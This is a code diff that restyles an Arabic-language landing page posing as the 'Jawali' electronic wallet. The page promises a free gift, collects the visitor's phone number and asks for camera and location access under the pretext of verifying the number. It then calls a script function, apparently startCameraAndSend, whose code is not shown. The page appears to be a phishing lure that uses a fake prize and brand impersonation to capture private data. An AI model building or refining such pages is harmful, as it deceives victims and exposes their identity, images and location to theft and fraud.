@@ -2,65 +2,112 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>الرئيسية - محفظة جوالي الالكترونية</title>
+  <title>محفظة جوالي الإلكترونية</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="مرحبا بكم في خدمة جوالي - جوائز قيمة">
+  <meta name="description" content="مرحبًا بك في محفظة جوالي - اربح جوائز قيمة مجانًا!">
   <style>
     body {
-      text-align: center;
       direction: rtl;
-      font-family: Tahoma, sans-serif;
-      background-color: #f9f9f9;
-      padding: 30px;
+      font-family: 'Tahoma', sans-serif;
+      background: linear-gradient(to bottom, #e9f5ff, #ffffff);
+      text-align: center;
+      padding: 40px 20px;
+      margin: 0;
     }
+
+    h1 {
+      color: #007bff;
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 30px 20px;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 18px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      margin-bottom: 15px;
+    }
+
     button {
+      width: 100%;
+      padding: 14px;
       font-size: 18px;
       font-weight: bold;
-      margin: 10px;
-      padding: 10px 30px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
+
     .start-button {
       background-color: #007bff;
       color: white;
     }
+
     .start-button:hover {
       background-color: #0056b3;
     }
+
     #consentBox {
       background: #fff3cd;
       border: 1px solid #ffeeba;
-      padding: 20px;
-      margin: 20px auto;
-      width: 60%;
-      border-radius: 8px;
-      font-size: 18px;
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      font-size: 16px;
+      color: #856404;
+    }
+
+    #carrierDisplay {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 15px;
+    }
+
+    #confirmationMessage {
+      font-size: 20px;
+      color: #28a745;
+      margin-top: 20px;
+    }
+
+    #logo {
+      width: 80px;
+      margin-bottom: 10px;
     }
   </style>
 </head>
 <body>
 
-  <h2>🎁 اضغط الزر للحصول على هدية مقدمة من محفظة جوالي الالكترونية (رصيد أو مزايا أو مبالغ نقدية)</h2>
+  <div class="container">
+    <img src="logo.png" alt="شعار محفظة جوالي" id="logo" />
+    <h1>🎁 اربح هدية مجانية من محفظة جوالي</h1>
 
-  <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك"
-         style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>
+    <input type="tel" id="phoneNumber" placeholder="📱 أدخل رقم هاتفك">
+    <p id="carrierDisplay"></p>
 
-  <p id="carrierDisplay" style="font-size: 18px; color: #555;"></p>
+    <div id="consentBox">
+      <p>🔒 سيتم التحقق من رقمك وطلب الإذن للوصول إلى الكاميرا والموقع</p>
+      <button class="start-button" onclick="confirmConsent()">أوافق</button>
+    </div>
 
-  <div id="consentBox">
-    <p>📸 سيطلب إذن لتشغيل الكاميرا من أجل التحقق من رقمك</p>
-    <button class="start-button" onclick="confirmConsent()">أوافق</button>
+    <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد رقم الهاتف</button>
+
+    <p id="confirmationMessage" style="display: none;">
+      ✅ تم تأكيد رقمك: <span id="confirmedNumber"></span>
+    </p>
   </div>
 
-  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد</button>
-
-  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
-    ✅ تم تأكيد رقمك: <span id="confirmedNumber"></span>
-  </p>
-
-  <!-- ربط ملف الجافاسكربت -->
   <script src="index.js"></script>
 </body>
 </html>
